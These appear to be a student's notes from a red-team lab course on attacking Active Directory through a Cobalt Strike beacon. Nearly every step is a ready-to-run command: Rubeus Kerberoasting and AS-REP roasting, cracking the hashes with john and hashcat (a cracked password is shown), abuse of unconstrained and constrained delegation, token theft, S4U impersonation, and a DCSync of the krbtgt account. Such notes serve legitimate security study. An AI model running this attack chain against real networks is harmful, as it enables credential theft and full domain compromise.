## Kerberoasting  ( Opsec  Method )
A much safer approach is to enumerate possible candidates first and roast them selectively.  This LDAP query will find domain users who have an SPN set.

Ran ADSEARCH to  from System on WKSTN-2 to get SPN names
```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
```
![[Pasted image 20230830125846.png]]
Kerberoasting the individual mssql_svc account - can get krbtgt of any computer that I want to move to.
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
```
Put KRBTGT into cobalt strike for all three accounts,  squid_svc - honey_svc, - and mssql_svc
![[Pasted image 20230830130619.png]]

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:squid_svc /nowrap
```
![[Pasted image 20230830131102.png]]
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:honey_svc /nowrap
```
![[Pasted image 20230830131039.png]]
As with kerberoasting, we don't want to asreproast every account in the domain.

# Can Use hashcat to crack Kerberoasted Passwords.
# ASREP ROASTING ( Opsec )

Finsing Sam Account Names to ASREP ROAST
```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
```
![[Pasted image 20230830131857.png]]
AsrepRoasting to get password.
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asreproast /user:squid_svc /nowrap
```
![[Pasted image 20230830132606.png]]

Can Crack hash offline
Use `--format=krb5asrep --wordlist=wordlist squid_svc` for john or `-a 0 -m 18200 squid_svc wordlist` for hashcat.

```BASH

$ john --format=krb5asrep --wordlist=wordlist squid_svc
Passw0rd!        ($krb5asrep$squid_svc@dev.cyberbotic.io)
```

# Unconstrained Delegation

This query will return all computers that are permitted for unconstrained delegation
- Ran command on WKSTN-2 as bfarmer
```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
```
![[Pasted image 20230830141841.png]]
In order to capture nlamb's TGT while on WEB.DEV due to web and DC2 being vulnerable to unconstrained delegation - this monitors incoming TGT's. I couldnt find a way to stop the monitoring.
```powershell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```
![[Pasted image 20230830144837.png]]
On web we do not have access to the dc
```powershell
ls \\dc-2.dev.cyberbotic.io\c$
```
![[Pasted image 20230830150056.png]]
Now to abuse the Unconstrained Delegation.
Creating a cmd.exe with nlamb's stolen TGT 
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFwj[...]MuSU8=
```
![[Pasted image 20230830151028.png]]
Stealing token
```powershell
beacon> steal_token 3444
```
![[Pasted image 20230830151125.png]]
Testing to see if we now have access to the dc and we do because we can see the c drive of the dc.
```powershell
ls \\dc-2.dev.cyberbotic.io\c$
```
![[Pasted image 20230830151217.png]]
# Constrained Delegation

This command is used to test Constrained Delegation

```powershell
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
```
![[Pasted image 20230830152347.png]]

On SQL triag'ing using rubeus  to get LUID
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
```
![[Pasted image 20230830154231.png]]
Utilizing Rubeus Luid to get TGT
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```
![[Pasted image 20230830154413.png]]

# Alternate Service Name

Impersonating nlamb
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /msdsspn:cifs/dc-2.dev.cyberbotic.io /altservice:ldap /user:sql-2$ /ticket: sql TGT TIcket here
```
![[Pasted image 20230830155836.png]]
Ticket Imported
```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:  SQL TGTTICKET HERE
```
![[Pasted image 20230830160011.png]]
Stealing Token on the sql machine as nlamb
```powershell
beacon> steal_token 1380
```
![[Pasted image 20230830160348.png]]
On DC2 dcsyncing
Got NTLM of krbtgt account.
```powershell
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
```
![[Pasted image 20230830161017.png]]

# S4U2Self Abuse

S4U2 Self abuse is utilized when we have a TGT for one account (nlamb) and want to access it remotely. nlamb is a domain admin therfore will have access to the DC, so as a regular user (bfarmer) we are able to pass a TGT of a privileged user to ourselves.

```powershell
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:nlamb /self /altservice:cifs/dc-2.dev.cyberbotic.io /user:dc-2$ /ticket:doIFuj[...]lDLklP /nowrap
```